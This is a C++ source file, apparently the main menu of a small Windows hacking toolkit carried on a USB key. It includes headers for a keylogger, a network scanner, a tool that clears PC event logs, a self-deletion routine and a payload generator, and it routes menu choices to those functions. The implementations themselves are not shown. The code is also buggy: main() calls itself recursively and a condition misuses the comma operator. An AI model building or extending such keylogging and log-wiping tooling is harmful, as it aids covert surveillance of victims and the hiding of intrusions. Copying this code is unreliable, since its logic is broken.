#include <stdio.h>
#include <iostream>
#include <windows.h>
#include <unistd.h>
#include "k3yl0gg20211609.h" // keylogger 
#include "n3tw0rk5c4nn3r20211609.h"  // Network Scanning **not working**
#include "cl34r3v3nt.h" // Clear logs from PC **not finished**
#include "h3lp.h" //help
#include <process.h>
#include "d3l3t3.h" // auto delete soft
#include "securityoverflow.h" // secure cin
#include "color.h" // couleur terminal
#include "anim4ti0n.h" // loading animation

using namespace std;
string MyString;

//main part menu option


	int main()
	{
		color();
		int x = 0;

HWND console = GetConsoleWindow();
  RECT ConsoleRect;
  GetWindowRect(console, &ConsoleRect); 

   MoveWindow(console, ConsoleRect.left, ConsoleRect.top, 1000, 300, TRUE);


// color();
system("title S0FT SCR1PT V.2 @34ZY");

animload();
system("cls");

  GetWindowRect(console, &ConsoleRect); 

   MoveWindow(console, ConsoleRect.left, ConsoleRect.top, 1200, 700, TRUE);

std::cout << R"(
                                                                                                                                                                                                                        
      @@@@@@    @@@@@@   @@@@@@@@  @@@@@@@      @@@@@@    @@@@@@@  @@@@@@@   @@@  @@@@@@@   @@@@@@@     @@@  @@@        @@@@@@   
     @@@@@@@   @@@@@@@@  @@@@@@@@  @@@@@@@     @@@@@@@   @@@@@@@@  @@@@@@@@  @@@  @@@@@@@@  @@@@@@@     @@@  @@@       @@@@@@@@  
     !@@       @@!  @@@  @@!         @@!       !@@       !@@       @@!  @@@  @@!  @@!  @@@    @@!       @@!  @@@            @@@  
     !@!       !@!  @!@  !@!         !@!       !@!       !@!       !@!  @!@  !@!  !@!  @!@    !@!       !@!  @!@           @!@   
     !!@@!!    @!@  !@!  @!!!:!      @!!       !!@@!!    !@!       @!@!!@!   !!@  @!@@!@!     @!!       @!@  !@!          !!@    
      !!@!!!   !@!  !!!  !!!!!:      !!!        !!@!!!   !!!       !!@!@!    !!!  !!@!!!      !!!       !@!  !!!         !!:     
          !:!  !!:  !!!  !!:         !!:            !:!  :!!       !!: :!!   !!:  !!:         !!:       :!:  !!:        !:!      
         !:!   :!:  !:!  :!:         :!:           !:!   :!:       :!:  !:!  :!:  :!:         :!:        ::!!:!   :!:  :!:       
     :::: ::   ::::: ::   ::          ::       :::: ::    ::: :::  ::   :::   ::   ::          ::         ::::    :::  :: :::::  
     :: : :     : :  :    :           :        :: : :     :: :: :   :   : :  :     :           :           :      :::  :: : :::  
                                                                                                                            )";
std::cout<<"\n                                            A tool that is essential to have in your USB key\n";
std::cout<<"\n\n";                                       

std::cout<<"\n info : Tool to use in local V.2\n";
std::cout<<" *Keylogger section up.\n";
std::cout<<" *Help section up.\n";
std::cout<<" *Generate Payload section\n";

  
std::cout<<"\n\n\n\n";                                       



	std::cout << " Choose your option  :\n\n\n 1 - Keylogger\n 2 - Network scan\n 3 - Clear PC Logs\n 4 - Autodelete S0ft\n 5 - Generate Payload\n 99 - help \n\n\n Type a number : ";
	
	std::cin >> x;
	
	
	if (x==1) {
		securityoverflow();
		system("cls");
		keylog();
		main();
		return 0;
	}
	else if (x==2) {
		securityoverflow();
		system("cls");
		animload();
		system("cls");
		network_scan();
		main();
		return 0;
	}
	else if (x==3) {
		securityoverflow();
		system("cls");
		animload();
		system("cls");
		clear_event();
		main();
		return 0;
	}
	else if (x==4) {
		securityoverflow();
		DelMe();
		return 0;
	}
	else if (x==99) {
		securityoverflow();
		system("cls");
		help();
		main();
		return 0;
	}
	// add some conditions

	else if (x!=0,1,2,3,4,99) {
		 std::cout << " Error! enter a valid number please...\n\n";
		 Sleep(1500);
		while (cin.fail())
    	{
        std::cin.clear(); // clear input buffer to restore cin to a usable state
        std::cin.ignore(INT_MAX, '\n'); // ignore last input
        std::cout << " You can only enter numbers.\n";
		system("cls");
    	}
		 x = 0;
		 system("cls");
		 main();
	}	
	else {

		std::cout<<"yay you found a bug";

	}
	
	}

